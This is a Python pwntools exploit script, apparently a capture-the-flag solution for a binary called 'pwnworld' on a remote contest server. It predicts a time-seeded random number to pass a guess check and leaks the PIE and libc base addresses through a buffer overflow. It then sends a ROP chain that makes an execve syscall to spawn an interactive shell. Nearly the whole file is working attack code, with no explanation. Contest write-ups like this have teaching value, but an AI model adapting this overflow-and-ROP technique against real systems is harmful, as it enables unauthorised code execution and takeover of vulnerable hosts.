#!usr/bin/python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pwnworld'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
lib = CDLL("./libc.so.6")
context.log_level = 'debug'
host, port = 'ctf-gemastik.ub.ac.id', 10012

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+51
break *main+122
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# sudo timedatectl set-timezone America/Vancouver
conn = initialize()
rop = ROP(exe)

lib.srand(lib.time(None))
rand = lib.rand() % 0x1a1
conn.sendlineafter(b'guess?', str(rand).encode())
    
conn.recvuntil(b'you: ')
elf.address = int(conn.recvline().strip(), 16) - 0x404c

offset = 280
payload = flat({
    offset: [
        elf.address + rop.rdi.address,
        elf.got['puts'],
        elf.plt['puts'],
        elf.address + rop.ret.address,
        elf.sym['main']
    ]
})

conn.sendlineafter(b'feedback?', payload)

conn.recvuntil(b'See yaa\n')
libc.address = unpack(conn.recvline().strip().ljust(8, b'\x00')) - 0x7aa10

payload = flat({
    offset: [
        elf.address + rop.rdi.address,
        libc.address + 0x1b51d2, # binsh
        libc.address + 0x40143, # pop rax; ret;
        0x3b,
        libc.address + 0x2573e, # pop rsi; ret;
        0,
        libc.address + 0x26302, # pop rdx; ret;
        0,
        libc.address + 0x8b9b6 # syscall; ret; 
    ]
})

# lib.srand(lib.time(None) + 1)
# rand = lib.rand() % 0x1a1
conn.sendlineafter(b'guess?', str(rand).encode())

conn.sendlineafter(b'feedback?', payload)

info('piebase: %#x', elf.address)
info('libc address: %#x', libc.address)

conn.interactive()